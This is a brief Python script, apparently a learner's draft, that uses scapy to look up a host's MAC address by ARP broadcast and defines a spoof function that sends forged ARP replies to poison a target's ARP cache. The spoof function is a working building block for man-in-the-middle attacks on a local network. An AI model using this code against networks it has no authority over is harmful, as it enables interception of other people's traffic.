#1/usr/bin/env/python

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst="00:0c:29:30:5f:75", psrc=spoof_ip) # op=2 is response
    scapy.send(packet)

get_mac("192.168.198.2")



